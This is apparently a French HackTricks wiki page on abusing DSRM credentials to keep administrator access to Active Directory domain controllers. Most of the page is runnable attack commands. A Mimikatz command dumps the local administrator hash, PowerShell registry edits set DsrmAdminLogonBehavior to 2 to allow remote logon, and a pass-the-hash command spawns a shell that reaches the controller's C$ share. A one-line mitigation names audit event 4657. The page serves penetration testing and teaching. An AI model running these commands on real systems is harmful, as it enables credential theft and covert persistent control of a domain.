{{#include ../../banners/hacktricks-training.md}}

# DSRM Credentials

Il y a un compte **administrateur local** dans chaque **DC**. En ayant des privilèges d'administrateur sur cette machine, vous pouvez utiliser mimikatz pour **extraire le hash de l'administrateur local**. Ensuite, en modifiant un registre pour **activer ce mot de passe**, vous pouvez accéder à distance à cet utilisateur administrateur local.\
Tout d'abord, nous devons **extraire** le **hash** de l'utilisateur **administrateur local** à l'intérieur du DC :
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
Ensuite, nous devons vérifier si ce compte fonctionnera, et si la clé de registre a la valeur "0" ou n'existe pas, vous devez **la définir sur "2"** :
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
Ensuite, en utilisant un PTH, vous pouvez **lister le contenu de C$ ou même obtenir un shell**. Notez que pour créer une nouvelle session powershell avec ce hash en mémoire (pour le PTH), **le "domaine" utilisé est simplement le nom de la machine DC :**
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
Plus d'infos à ce sujet dans : [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) et [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)

## Atténuation

- ID d'événement 4657 - Audit de la création/changement de `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior`

{{#include ../../banners/hacktricks-training.md}}
